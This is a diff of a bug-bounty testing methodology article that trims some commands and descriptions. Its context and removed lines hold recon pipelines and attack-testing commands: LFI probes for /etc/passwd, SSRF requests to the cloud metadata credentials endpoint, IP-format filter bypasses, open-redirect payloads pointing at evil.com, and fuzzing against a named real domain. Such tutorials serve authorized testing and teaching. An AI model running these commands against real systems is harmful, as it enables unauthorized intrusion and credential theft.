@@ -91,8 +91,6 @@ This section covers multiple techniques to extract IP addresses linked to domain
 curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
 curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
 curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
-cat domains.txt | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > amass.txt
-grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
 shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
 
 Discover Live Hosts
@@ -117,8 +115,6 @@ Passive Crawling
 cat livesubdomains.txt | gau | sort -u > urls2.txt
 urlfinder -d tesla.com | sort -u >urls3.txt
 echo example.com | gau --mc 200 | urldedupe >urls.txt
-cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt
-cat output.txt | sed 's/=.*/=/' >final.txt
 
 Param Extraction
 Once you’ve collected a large list of URLs during recon, the next step is to extract only those URLs that contain parameters. ideal targets for testing vulnerabilities like XSS, SQLi, Open Redirect and for running Nuclei DAST templates.
@@ -162,7 +158,6 @@ dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,o
 
 Using FFUF
 ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
-ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://ens.domains/FUZZ -fc 401,403,404 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -r -t 60 --rate 100 -c
 
 JavaScript File Discovery and Analysis
 JavaScript files often contain valuable information such as hidden API endpoints, internal functions, parameter names, hardcoded credentials, tokens, even sensitive keys and Development comments and debugging information. Analyzing these files can give deep insight into the application’s logic and uncover attack surfaces that aren’t visible in the frontend.
@@ -246,18 +241,12 @@ gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl 
 
 Alternative LFI method:
 echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
-echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
-Key components:
-gf lfi: Filters URLs potentially vulnerable to LFI
-qsreplace “FUZZ”: Replaces parameter values with FUZZ keyword
-ffuf: Fast web fuzzer for testing payloads
--mr “root:(x|\*|\$[^\:]*):0:0:”: Matches Linux passwd file format
 
 LFI testing Using FFUF Request Mode
 ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
 
 CORS (Cross-Origin Resource Sharing) Testing
-Misconfigured CORS policies can allow unauthorized domains to access sensitive data or perform privileged actions across origins potentially leading to serious security issues like account takeover or data theft. This section covers both manual and automated methods to detect insecure CORS configurations using simple curl commands and powerful tools like httpx, nuclei, Corsy and CORScanner.
+Misconfigured CORS policies can allow unauthorized domains to access sensitive data or perform privileged actions across origins potentially leading to serious security issues like account takeover or data theft. This section covers both manual and automated methods to detect insecure CORS configurations.
 
 Manual CORS testing using curl
 curl -H "Origin: http://example.com" -I https://domain.com/wp-json/
@@ -271,7 +260,7 @@ python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\
 python3 CORScanner.py -u https://example.com -d -t 10
 
 Subdomain Takeover Detection
-Subdomain takeover occurs when a subdomain points to an external service (like GitHub Pages, Heroku or S3) that is no longer claimed allowing attackers to hijack it. Tools like subzy can automate the detection process by checking for takeover signatures across multiple providers, verifying SSL, and using high concurrency for faster results while filtering out false positives.
+Subdomain takeover occurs when a subdomain points to an external service (like GitHub Pages, Heroku or S3) that is no longer claimed allowing attackers to hijack it. Tools like subzy can automate the detection process by checking for takeover signatures across multiple providers.
 subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
 This tool checks for subdomain takeover vulnerabilities by:
 Testing multiple service providers
@@ -290,7 +279,7 @@ Looks for “Index of” in responses
 Checks for directory listing
 
 SSRF Testing & Exploitation
-Server-Side Request Forgery (SSRF) is a powerful vulnerability that allows attackers to make the server initiate requests to internal or external resources. This can lead to sensitive data exposure, cloud metadata access, internal port scanning or even remote code execution when chained properly. This section covers a full SSRF testing workflow from identifying vulnerable parameters, using automation tools, crafting bypass payloads, to chaining SSRF with other vulnerabilities for maximum impact.
+Server-Side Request Forgery (SSRF) is a powerful vulnerability that allows attackers to make the server initiate requests to internal or external resources. This can lead to sensitive data exposure, cloud metadata access, internal port scanning or even remote code execution when chained properly.
 
 Look for common SSRF-prone parameters in URLs
 cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
@@ -300,10 +289,8 @@ Nuclei for automated scanning
 cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
 Basic SSRF to local services
 curl "https://target.com/page?url=http://127.0.0.1:80/"
-curl "https://target.com/page?url=http://localhost:8080"
 Target internal cloud metadata
 curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
-curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 Bypass filters with alternative IP formats
 http://127.0.0.1%23.google.com
 http://127.1
@@ -320,19 +307,9 @@ final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
 cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
 subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
 cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
-echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
-subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
-
-Note: This checklist and the methods shared here are still a work in progress. I’ll be adding more advanced techniques and tools as I find time. Make sure to revisit this article in some days or weekly for the latest updates and additions!
 
 Conclusion
 This methodology offers a structured and proven approach to web application security testing, built on years of hands-on experience from the bug bounty community. While tools play a role, true success comes from understanding core technologies, thinking like an attacker and staying persistent through trial and error.
 
-Connect with Me
-If you enjoyed this article and want to stay updated with more content on bug bounty and cybersecurity follow me on:
-Twitter (X): @coffinxp7 | GitHub coffinxp | Website: lostsec.xyz | YouTube: Lostsec | Discord Lostsec
-
 Disclaimer
 The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly.
-
-Source: https://t.co/bykbiDNYGG
